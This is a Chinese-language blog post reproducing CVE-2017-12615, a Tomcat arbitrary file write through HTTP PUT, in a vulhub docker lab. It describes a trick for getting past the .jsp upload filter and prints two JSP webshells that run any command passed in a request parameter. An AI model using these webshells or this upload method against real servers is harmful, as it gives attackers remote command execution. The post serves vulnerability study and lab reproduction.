---
layout: post
title: Tomcat任意文件写入
tags: Tomcat
categories: CVE-2017-12615
---

# Tomcat任意写入文件漏洞（CVE-2017-12615）

## 漏洞描述

该漏洞是由于Tomcat设置了写许可权（readonly = false），这导致我们可以使用PUT方法将文件写入服务器。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat/CVE-2017-12615/15928133515426.jpg)

### 漏洞复现

首先通过GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署。环境启动后，访问`http://your-ip:8080`即可查看tomcat默认页面。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat/CVE-2017-12615/15928169764804.jpg)

然后发送如下数据包，利用PUT方法写入jsp，这里上传文件的时候由于禁止上传jsp后缀的，所以用//包裹来绕过限制

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat/CVE-2017-12615/15928183250242.jpg)

然后访问上传的jsp文件执行命令
![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat/CVE-2017-12615/15928182568067.jpg)

以下是jsp代码

```
无回显：
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

有回显：
<%   
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
%>
```

## 受影响的版本

在启用HTTP PUT的Windows上运行Apache Tomcat 7.0.0至7.0.79

## 参考链接

https://itindex.net/detail/57778-%E5%85%B8%E5%9E%8B-jsp-webshell